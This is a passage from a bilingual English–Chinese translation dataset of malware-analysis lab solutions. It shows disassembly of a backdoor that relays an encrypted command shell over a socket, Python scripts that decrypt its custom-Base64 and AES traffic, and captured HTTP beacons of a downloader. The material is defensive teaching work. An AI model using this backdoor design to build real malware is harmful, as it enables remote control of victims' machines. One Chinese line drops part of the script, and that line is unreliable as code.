  zh: 在 aes_thread（0x40132B）中，我们看到参数是如何使用的。列表 13-1 3
- en: 12L shows select portions of aes_thread with calls to ReadFile and WriteFile,
    and the origin of the handles passed to those functions.
  id: totrans-4594
  prefs: []
  type: TYPE_NORMAL
  zh: 12L 显示了 aes_thread 中对 ReadFile 和 WriteFile 的调用以及传递给这些函数的句柄的来源。
- en: 0040137A mov eax, [ebp+arg_0]
  id: totrans-4595
  prefs: []
  type: TYPE_NORMAL
  zh: 0040137A mov eax, [ebp+arg_0]
- en: 0040137D mov [ebp+var_BE0], eax
  id: totrans-4596
  prefs: []
  type: TYPE_NORMAL
  zh: 0040137D mov [ebp+var_BE0], eax
- en: '...'
  id: totrans-4597
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004013A2 mov ecx, [ebp+var_BE0]
  id: totrans-4598
  prefs: []
  type: TYPE_NORMAL
  zh: 004013A2 mov ecx, [ebp+var_BE0]
- en: 004013A8 mov edx, [ecx]
  id: totrans-4599
  prefs: []
  type: TYPE_NORMAL
  zh: 004013A8 mov edx, [ecx]
- en: 004013AA push edx  ; hFile
  id: totrans-4600
  prefs: []
  type: TYPE_NORMAL
  zh: 004013AA push edx  ; hFile
- en: 004013AB call ds:ReadFile
  id: totrans-4601
  prefs: []
  type: TYPE_NORMAL
  zh: 004013AB call ds:ReadFile
- en: '...'
  id: totrans-4602
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040144A mov eax, [ebp+var_BE0]
  id: totrans-4603
  prefs: []
  type: TYPE_NORMAL
  zh: 0040144A mov eax, [ebp+var_BE0]
- en: 00401450 mov ecx, [eax+4]
  id: totrans-4604
  prefs: []
  type: TYPE_NORMAL
  zh: 00401450 mov ecx, [eax+4]
- en: 00401453 push ecx  ; hFile
  id: totrans-4605
  prefs: []
  type: TYPE_NORMAL
  zh: 00401453 push ecx  ; hFile
- en: 00401454 call ds:WriteFile
  id: totrans-4606
  prefs: []
  type: TYPE_NORMAL
  zh: 00401454 call ds:WriteFile
- en: '*Listing 13-12L: Handles passed to ReadFile and WriteFile in aes_thread* The
    value pushed for ReadFile at  can be mapped back to var_58/var_18, as shown in
    Listing 13-11L at . The value pushed for WriteFile in Listing 13-12L at  can
    be mapped back to var_54/arg_10, as shown in Listing 13-11L'
  id: totrans-4607
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-12L：aes_thread 中传递给 ReadFile 和 WriteFile 的句柄* 在  传递给 ReadFile 的值可以映射回
    var_58/var_18，如列表 13-11L 中的  所示。在列表 13-12L 中传递给 WriteFile 的值可以映射回 var_54/arg_10，如列表
    13-11L 所示'
- en: at .
  id: totrans-4608
  prefs: []
  type: TYPE_NORMAL
  zh: 在 .
- en: Solutions to Labs
  id: totrans-4609
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**623**'
  id: totrans-4610
  prefs: []
  type: TYPE_NORMAL
  zh: '**623**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4611
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Tracing the handle values back to their origin, we find first that var_58
  id: totrans-4612
  prefs: []
  type: TYPE_NORMAL
  zh: 追踪句柄值到它们的起源，我们首先发现 var_58
- en: and var_18 hold a handle to a pipe that is created early in the function at
    0x0040132B, and that this pipe is connected with the output of a command shell.
    The command hSourceHandle is copied to the standard output and standard error
    of the command shell started by the CreateProcess command at 0x0040177B, as shown
    in Listing 13-13L.
  id: totrans-4613
  prefs: []
  type: TYPE_NORMAL
  zh: 和var_18持有在函数早期（0x0040132B）创建的管道句柄，并且这个管道与命令外壳的输出相连。命令hSourceHandle被复制到由CreateProcess命令在0x004017B处启动的命令外壳的标准输出和标准错误，如列表13-13L所示。
- en: 00401748 mov ecx, [ebp+hSourceHandle]
  id: totrans-4614
  prefs: []
  type: TYPE_NORMAL
  zh: 00401748 mov ecx, [ebp+hSourceHandle]
- en: 0040174B mov [ebp+StartupInfo.hStdOutput], ecx 0040174E mov edx, [ebp+hSourceHandle]
  id: totrans-4615
  prefs: []
  type: TYPE_NORMAL
  zh: 0040174B mov [ebp+StartupInfo.hStdOutput], ecx 0040174E mov edx, [ebp+hSourceHandle]
- en: '00401751 mov [ebp+StartupInfo.hStdError], edx *Listing 13-13L: Connecting a
    pipe to shell output*'
  id: totrans-4616
  prefs: []
  type: TYPE_NORMAL
  zh: 00401751 mov [ebp+StartupInfo.hStdError], edx *列表13-13L：将管道连接到外壳输出*
- en: The other handle used by WriteFile in aes_thread (var_54/arg_10) can be traced
    to the parameter passed in from the _main function (0x00401879)—a networking socket
    created with the connect call.
  id: totrans-4617
  prefs: []
  type: TYPE_NORMAL
  zh: aes_thread（var_54/arg_10）中WriteFile使用的另一个句柄可以追溯到从_main函数（0x00401879）传入的参数——使用connect调用创建的网络套接字。
- en: The aes_thread (0x0040132B) function reads the output of the launched command
    shell and encrypts it before writing it to the network socket.
  id: totrans-4618
  prefs: []
  type: TYPE_NORMAL
  zh: aes_thread（0x0040132B）函数读取启动的命令外壳的输出，并在将其写入网络套接字之前对其进行加密。
- en: 'The custom Base64-encoding function (0x00401082) is also used in a function
    (0x0040147C) that is started via its own thread. The tracing of inputs is very
    similar to the tracing of the inputs for the AES thread, with a mirror image conclusion:
    The Base64 thread reads as input the remote socket, and after it decodes the function,
    it sends the result to the input of the command shell.'
  id: totrans-4619
  prefs: []
  type: TYPE_NORMAL
  zh: 自定义Base64编码函数（0x00401082）也用于一个通过其自己的线程启动的函数（0x0040147C）。输入的跟踪与AES线程输入的跟踪非常相似，得出一个镜像结论：Base64线程将远程套接字作为输入读取，并在解码函数后，将结果发送到命令外壳的输入。
- en: '**Modified Base64 Decoding**'
  id: totrans-4620
  prefs: []
  type: TYPE_NORMAL
  zh: '**修改后的Base64解码**'
- en: 'Having established the two types of encoding in this malware, let’s try to
    decrypt the content. Beginning with the custom Base64 encoding, we’ll assume that
    part of the captured network communication coming from the remote site is the
    string: BInaEi==. Listing 13-14L shows a custom script for decrypting modified
    Base64 implementations.'
  id: totrans-4621
  prefs: []
  type: TYPE_NORMAL
  zh: 在此恶意软件中建立了两种编码类型后，让我们尝试解密内容。从自定义Base64编码开始，我们假设从远程站点捕获的部分网络通信是字符串：BInaEi==。列表13-14L显示了用于解密修改后的Base64实现的自定义脚本。
- en: import string
  id: totrans-4622
  prefs: []
  type: TYPE_NORMAL
  zh: import string
- en: import base64
  id: totrans-4623
  prefs: []
  type: TYPE_NORMAL
  zh: import base64
- en: s = ""
  id: totrans-4624
  prefs: []
  type: TYPE_NORMAL
  zh: s = ""
- en: tab = 'CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
  id: totrans-4625
  prefs: []
  type: TYPE_NORMAL
  zh: tab = 'CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
- en: b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  id: totrans-4626
  prefs: []
  type: TYPE_NORMAL
  zh: b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
- en: ciphertext = 'BInaEi=='
  id: totrans-4627
  prefs: []
  type: TYPE_NORMAL
  zh: ciphertext = 'BInaEi=='
- en: 'for ch in ciphertext:'
  id: totrans-4628
  prefs: []
  type: TYPE_NORMAL
  zh: 'for ch in ciphertext:'
- en: 'if (ch in tab):'
  id: totrans-4629
  prefs: []
  type: TYPE_NORMAL
  zh: 'if (ch in tab):'
- en: s += b64[string.find(tab,str(ch))]
  id: totrans-4630
  prefs: []
  type: TYPE_NORMAL
  zh: s += b64[string.find(tab,str(ch))]
- en: 'elif (ch == ''=''):'
  id: totrans-4631
  prefs: []
  type: TYPE_NORMAL
  zh: 'elif (ch == ''=''):'
- en: s += '='
  id: totrans-4632
  prefs: []
  type: TYPE_NORMAL
  zh: s += '='
- en: print base64.decodestring(s)
  id: totrans-4633
  prefs: []
  type: TYPE_NORMAL
  zh: print base64.decodestring(s)
- en: '*Listing 13-14L: Custom Base64 decryption script*'
  id: totrans-4634
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-14L：自定义Base64解码脚本*'
- en: '**624**'
  id: totrans-4635
  prefs: []
  type: TYPE_NORMAL
  zh: '**624**'
- en: Appendix C
  id: totrans-4636
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4637
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**NOTE**'
  id: totrans-4638
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*The code in Listing 13-14L is a generic script that can be repurposed for
    any custom* *Base64 implementation by redefining the tab variable.*'
  id: totrans-4639
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-14L中的代码是一个通用脚本，可以通过重新定义tab变量来用于任何自定义Base64实现。*'
- en: Using this script, we translate the string to see what command was sent to the
    command shell. The output in Listing 13-15L shows that the attacker is sending
    a request for a directory listing (dir).
  id: totrans-4640
  prefs: []
  type: TYPE_NORMAL
  zh: 使用此脚本，我们将字符串翻译以查看发送到命令外壳的命令。列表13-15L中的输出显示攻击者正在发送目录列表（dir）的请求。
- en: $ python custom_b64_decrypt.py
  id: totrans-4641
  prefs: []
  type: TYPE_NORMAL
  zh: $ python custom_b64_decrypt.py
- en: dir
  id: totrans-4642
  prefs: []
  type: TYPE_NORMAL
  zh: dir
- en: '*Listing 13-15L: Output of custom Base64 decryption script* **Decrypting AES**'
  id: totrans-4643
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-15L：自定义Base64解码脚本输出* **解密AES**'
- en: Translating the AES side of the command channel is slightly more challenging.
    For example, say that the malware sends the raw stream content shown in Listing
    13-16L.
  id: totrans-4644
  prefs: []
  type: TYPE_NORMAL
  zh: 命令通道的AES部分翻译稍微更具挑战性。例如，假设恶意软件发送列表13-16L中显示的原始流内容。
- en: 00000000 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 7...Q .. ....e ..
  id: totrans-4645
  prefs: []
  type: TYPE_NORMAL
  zh: 00000000 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 7...Q .. ....e ..
- en: 00000010 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 O....v.. M.Q...Q.
  id: totrans-4646
  prefs: []
  type: TYPE_NORMAL
  zh: 00000010 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 O....v.. M.Q...Q.
- en: 00000020 cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df .....58\ ...fx@..
  id: totrans-4647
  prefs: []
  type: TYPE_NORMAL
  zh: 00000020 cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df .....58\ ...fx@..
- en: 00000030 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 JS...WmO ....)y/.
  id: totrans-4648
  prefs: []
  type: TYPE_NORMAL
  zh: 00000030 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 JS...WmO ....)y/.
- en: 00000040 ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e .`.#.{(. M.{.....
  id: totrans-4649
  prefs: []
  type: TYPE_NORMAL
  zh: 00000040 ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e .`.#.{(. M.{.....
- en: 00000050 bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d .'.G.... f.......
  id: totrans-4650
  prefs: []
  type: TYPE_NORMAL
  zh: 00000050 bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d .'.G.... f.......
- en: 00000060 ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd .... I;. ..n.j...
  id: totrans-4651
  prefs: []
  type: TYPE_NORMAL
  zh: 00000060 ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd .... I;. ..n.j...
- en: 00000070 a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 .v."...8 -/V.x./.
  id: totrans-4652
  prefs: []
  type: TYPE_NORMAL
  zh: 00000070 a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 .v."...8 -/V.x./.
- en: 00000080 af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 .d...C.. G...o.I9
  id: totrans-4653
  prefs: []
  type: TYPE_NORMAL
  zh: 00000080 af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 .d...C.. G...o.I9
- en: '**1 3**'
  id: totrans-4654
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: '*Listing 13-16L: AES-encrypted network content*'
  id: totrans-4655
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-16L：AES 加密网络内容*'
- en: The PyCrypto library provides convenient cryptographic routines for dealing
    with data like this. Using the code shown in Listing 13-17L, we can decrypt the
    content.
  id: totrans-4656
  prefs: []
  type: TYPE_NORMAL
  zh: PyCrypto 库提供了方便的加密例程来处理此类数据。使用列表 13-17L 中的代码，我们可以解密内容。
- en: from Crypto.Cipher import AES
  id: totrans-4657
  prefs: []
  type: TYPE_NORMAL
  zh: from Crypto.Cipher import AES
- en: import binascii
  id: totrans-4658
  prefs: []
  type: TYPE_NORMAL
  zh: import binascii
- en: raw = ' 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 ' + \
  id: totrans-4659
  prefs: []
  type: TYPE_NORMAL
  zh: raw = ' 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 ' + \
- en: ''' 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 '' + \'
  id: totrans-4660
  prefs: []
  type: TYPE_NORMAL
  zh: ''' 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 '' + \'
- en: ''' cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df '' + \'
  id: totrans-4661
  prefs: []
  type: TYPE_NORMAL
  zh: ''' cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df '' + \'
- en: ''' 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 '' + \'
  id: totrans-4662
  prefs: []
  type: TYPE_NORMAL
  zh: ''' 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 '' + \'
- en: ''' ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e '' + \'
  id: totrans-4663
  prefs: []
  type: TYPE_NORMAL
  zh: ''' ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e '' + \'
- en: ''' bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d '' + \'
  id: totrans-4664
  prefs: []
  type: TYPE_NORMAL
  zh: ''' bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d '' + \'
- en: ''' ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd '' + \'
  id: totrans-4665
  prefs: []
  type: TYPE_NORMAL
  zh: ''' ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd '''
- en: ''' a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 '' + \'
  id: totrans-4666
  prefs: []
  type: TYPE_NORMAL
  zh: ''' a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 '' + \'
- en: ''' af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 '' '
  id: totrans-4667
  prefs: []
  type: TYPE_NORMAL
  zh: ''' af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 '' '
- en: ciphertext = binascii.unhexlify(raw.replace(' ','')) 
  id: totrans-4668
  prefs: []
  type: TYPE_NORMAL
  zh: ciphertext = binascii.unhexlify(raw.replace(' ','')) 
- en: obj = AES.new('ijklmnopqrstuvwx', AES.MODE_CBC) 
  id: totrans-4669
  prefs: []
  type: TYPE_NORMAL
  zh: obj = AES.new('ijklmnopqrstuvwx', AES.MODE_CBC) 
- en: print 'Plaintext is:\n' + obj.decrypt(ciphertext) 
  id: totrans-4670
  prefs: []
  type: TYPE_NORMAL
  zh: print 'Plaintext is:\n' + obj.decrypt(ciphertext) 
- en: '*Listing 13-17L: AES decryption script*'
  id: totrans-4671
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-17L：AES 解密脚本*'
- en: Solutions to Labs
  id: totrans-4672
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**625**'
  id: totrans-4673
  prefs: []
  type: TYPE_NORMAL
  zh: '**625**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4674
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The raw variable defined at  contains the raw network content identified in
    Listing 13-16L. The raw.replace function at  removes the spaces from the raw
    string, and the binascii.unhexlify function turns the hex representation into
    a binary string. The AES.new call at  creates a new AES object with the appropriate
    password and mode of operation, which allows for the following decrypt call at
    .
  id: totrans-4675
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处定义的原始变量包含在列表 13-16L 中标识的原始网络内容。在  处的原始.replace 函数从原始字符串中删除空格，binascii.unhexlify
    函数将十六进制表示转换为二进制字符串。在  处的 AES.new 调用使用适当的密码和操作模式创建一个新的 AES 对象，这允许在  处进行以下解密调用。
- en: The output of the AES script is shown in Listing 13-18L. Note that this captured
    content was simply a command prompt.
  id: totrans-4676
  prefs: []
  type: TYPE_NORMAL
  zh: AES 脚本的输出显示在列表 13-18L 中。请注意，捕获的内容只是一个命令提示符。
- en: $ python aes_decrypt.py
  id: totrans-4677
  prefs: []
  type: TYPE_NORMAL
  zh: $ python aes_decrypt.py
- en: 'Plaintext is:'
  id: totrans-4678
  prefs: []
  type: TYPE_NORMAL
  zh: 明文是：
- en: Microsoft Windows XP [Version 5.1.2600]
  id: totrans-4679
  prefs: []
  type: TYPE_NORMAL
  zh: Microsoft Windows XP [版本 5.1.2600]
- en: (C) Copyright 1985-2001 Microsoft Corp.
  id: totrans-4680
  prefs: []
  type: TYPE_NORMAL
  zh: (C) 版权所有 1985-2001 微软公司。
- en: C:\Documents and Settings\user\Desktop\13_3_demo>
  id: totrans-4681
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Documents and Settings\user\Desktop\13_3_demo>
- en: '*Listing 13-18L: AES decryption script output*'
  id: totrans-4682
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-18L：AES 解密脚本输出*'
- en: '**Crypto Pitfalls**'
  id: totrans-4683
  prefs: []
  type: TYPE_NORMAL
  zh: '**加密陷阱**'
- en: 'The default use of the PyCrypto library routines worked successfully in Lab
    13-3, but there are many potential pitfalls when trying to implement decryption
    routines directly, including the following:'
  id: totrans-4684
  prefs: []
  type: TYPE_NORMAL
  zh: 在实验 13-3 中，PyCrypto 库例程的默认使用成功，但在尝试直接实现解密例程时存在许多潜在陷阱，包括以下内容：
- en: 
  id: totrans-4685
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Block cryptography algorithms have many possible modes of operation, such as
    Electronic Code Book (ECB), Cipher Block Chaining (CBC), and Cipher Feedback (CFB).
    Each mode requires a different set of steps between the encoding or decoding of
    each block, and some require an initialization vector in addition to a password.
    If you don’t match the implementation used, decryption may work only partially
    or not at all.
  id: totrans-4686
  prefs: []
  type: TYPE_NORMAL
  zh: 块加密算法有许多可能的操作模式，例如电子密码本（ECB）、密码块链接（CBC）和密码反馈（CFB）。每种模式在编码或解码每个块之间都需要不同的步骤，并且一些模式除了密码外还需要一个初始化向量。如果您不匹配使用的实现，解密可能只能部分工作或完全不工作。
- en: 
  id: totrans-4687
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: In this lab, the key was provided directly. A given implementation may have
    its own technique for generating a key given a user-provided or string-based password.
    In such cases, the key-generation algorithm will need to be identified and duplicated
    separately.
  id: totrans-4688
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个实验室中，密钥是直接提供的。给定的实现可能有自己的技术，用于根据提供的用户密码或基于字符串的密码生成密钥。在这种情况下，需要单独识别和复制密钥生成算法。
- en: 
  id: totrans-4689
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Within a standard algorithm, there may be options that must be specified correctly.
    For example, a single encryption algorithm may allow multiple key sizes, block
    sizes, rounds of encryption or decryption, and padding strategies.
  id: totrans-4690
  prefs: []
  type: TYPE_NORMAL
  zh: 在标准算法中，可能会有必须正确指定的选项。例如，单个加密算法可能允许多个密钥大小、块大小、加密或解密轮数和填充策略。
- en: '**Lab 14-1 Solutions**'
  id: totrans-4691
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室14-1解决方案**'
- en: '***Short Answers***'
  id: totrans-4692
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-4693
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The program contains the URLDownloadToCacheFile function, which uses the COM
    interface. When malware uses COM interfaces, most of the content of its HTTP requests
    comes from within Windows itself, and therefore cannot be effectively targeted
    using network signatures.
  id: totrans-4694
  prefs: []
  type: TYPE_NORMAL
  zh: 程序包含URLDownloadToCacheFile函数，该函数使用COM接口。当恶意软件使用COM接口时，其HTTP请求的大部分内容来自Windows本身，因此不能通过网络签名有效地进行攻击。
- en: '**626**'
  id: totrans-4695
  prefs: []
  type: TYPE_NORMAL
  zh: '**626**'
- en: Appendix C
  id: totrans-4696
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4697
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 2\.
  id: totrans-4698
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The source elements are part of the host’s GUID and the username. The GUID is
    unique for any individual host OS, and the 6-byte portion used in the beacon should
    be relatively unique. The username will change depending on who is logged in to
    the system.
  id: totrans-4699
  prefs: []
  type: TYPE_NORMAL
  zh: 源元素是宿主机的GUID和用户名的一部分。GUID对于任何单个宿主操作系统是唯一的，并且在信标中使用的6字节部分应该是相对唯一的。用户名将根据谁登录到系统而变化。
- en: 3\.
  id: totrans-4700
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The attacker may want to track the specific hosts running the downloader and
    target specific users.
  id: totrans-4701
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可能想要跟踪运行下载器的特定主机和针对特定用户。
- en: 4\.
  id: totrans-4702
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The Base64 encoding is not standard since it uses an a instead of an equal sign
    (=) for its padding.
  id: totrans-4703
  prefs: []
  type: TYPE_NORMAL
  zh: Base64编码不是标准的，因为它使用字母a而不是等号（=）作为填充。
- en: 5\.
  id: totrans-4704
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: This malware downloads and executes other code.
  id: totrans-4705
  prefs: []
  type: TYPE_NORMAL
  zh: 该恶意软件下载并执行其他代码。
- en: 6\.
  id: totrans-4706
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The elements of the malware communication to be targeted include the domain
    name, the colons and the dash found after Base64 decoding, and the fact that the
    last character of the Base64 portion of the URI is the single character used for
    the filename of the PNG file.
  id: totrans-4707
  prefs: []
  type: TYPE_NORMAL
  zh: 要针对的恶意软件通信元素包括域名、Base64解码后的冒号和破折号，以及URI的Base64部分的最后一个字符是用于PNG文件文件名的单个字符。
- en: 7\.
  id: totrans-4708
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: Defenders may try to target elements other than the URI if they don’t realize
    that the OS determines them. In most cases, the Base64 string ends with an a,
    which usually makes the filename appear as *a.png*. However, if the username length
    is an even multiple of three, both the final character and the filename will depend
    on the last character in the encoded username. In this case, the filename is unpredictable.
  id: totrans-4709
  prefs: []
  type: TYPE_NORMAL
  zh: 如果防御者没有意识到操作系统决定了它们，他们可能会尝试攻击URI之外的元素。在大多数情况下，Base64字符串以字母a结尾，这通常使得文件名看起来像*a.png*。然而，如果用户名长度是三的偶数倍，则最终字符和文件名都将取决于编码用户名的最后一个字符。在这种情况下，文件名是不可预测的。
- en: 8\.
  id: totrans-4710
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: See the detailed analysis for recommended signatures.
  id: totrans-4711
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅详细分析以获取推荐的签名。
- en: '***Detailed Analysis***'
  id: totrans-4712
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Because there is no packet capture associated with this malware, we’ll use dynamic
    analysis to help us to understand its function. Running the malware, we see a
    beacon like the one shown in Listing 14-1L.
  id: totrans-4713
  prefs: []
  type: TYPE_NORMAL
  zh: 因为与该恶意软件没有关联的包捕获，我们将使用动态分析来帮助我们理解其功能。运行恶意软件，我们看到一个像列表14-1L中显示的信标。
- en: '**1 4**'
  id: totrans-4714
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: GET /NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa/a.png HTTP/1.1
  id: totrans-4715
  prefs: []
  type: TYPE_NORMAL
  zh: GET /NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa/a.png HTTP/1.1
- en: 'Accept: */*'
  id: totrans-4716
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept: */*'
- en: 'UA-CPU: x86'
  id: totrans-4717
  prefs: []
  type: TYPE_NORMAL
  zh: 'UA-CPU: x86'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-4718
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
  id: totrans-4719
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
- en: '2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
    Host: www.practicalmalwareanalysis.com'
  id: totrans-4720
  prefs: []
  type: TYPE_NORMAL
  zh: '2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
    Host: www.practicalmalwareanalysis.com'
- en: 'Connection: Keep-Alive'
  id: totrans-4721
  prefs: []
  type: TYPE_NORMAL
  zh: 'Connection: Keep-Alive'
- en: '*Listing 14-1L: Beacon request from initial malware run* **NOTE**'
  id: totrans-4722
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表14-1L：初始恶意软件运行时的信标请求** **注意**'
- en: '*If you have trouble seeing the beacon, make sure that your DNS requests are
    redirected to* *an internal host and that you have a program such as Netcat or
    INetSim accepting* *inbound connections to port 80\.*'
  id: totrans-4723
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果您在查看信标时遇到困难，请确保您的DNS请求被重定向到内部主机，并且您有一个如Netcat或INetSim之类的程序接受* *端口80的入站连接*。'
- en: Examining this single beacon alone, it is difficult to tell which components
    might be hard-coded. If you were to try running the malware multiple times, you
    would find that it uses the same beacon each time. If you have another host available,
    and you try to run the malware on it, you may get something like the result shown
    in Listing 14-2L.
  id: totrans-4724
  prefs: []
  type: TYPE_NORMAL
  zh: 仅检查这个单个信标，很难判断哪些组件可能是硬编码的。如果你尝试多次运行恶意软件，你会发现它每次都使用相同的信标。如果你有另一个主机可用，并且尝试在该主机上运行恶意软件，你可能会得到类似于第14-2L列表中所示的结果。
- en: Solutions to Labs
  id: totrans-4725
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**627**'
  id: totrans-4726
  prefs: []
  type: TYPE_NORMAL
  zh: '**627**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4727
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: GET /OTY6MDA6QTI6NDY6OTg6OTItdXNlcgaa/a.png HTTP/1.1
  id: totrans-4728
  prefs: []
  type: TYPE_NORMAL
  zh: GET /OTY6MDA6QTI6NDY6OTg6OTItdXNlcgaa/a.png HTTP/1.1
- en: 'Accept: */*'
  id: totrans-4729
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept: */*'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-4730
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR'
  id: totrans-4731
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR'
- en: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    Host: www.practicalmalwareanalysis.com'
  id: totrans-4732
  prefs: []
  type: TYPE_NORMAL
  zh: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    Host: www.practicalmalwareanalysis.com'
- en: 'Connection: Keep-Alive'
  id: totrans-4733
  prefs: []
  type: TYPE_NORMAL
  zh: 'Connection: Keep-Alive'
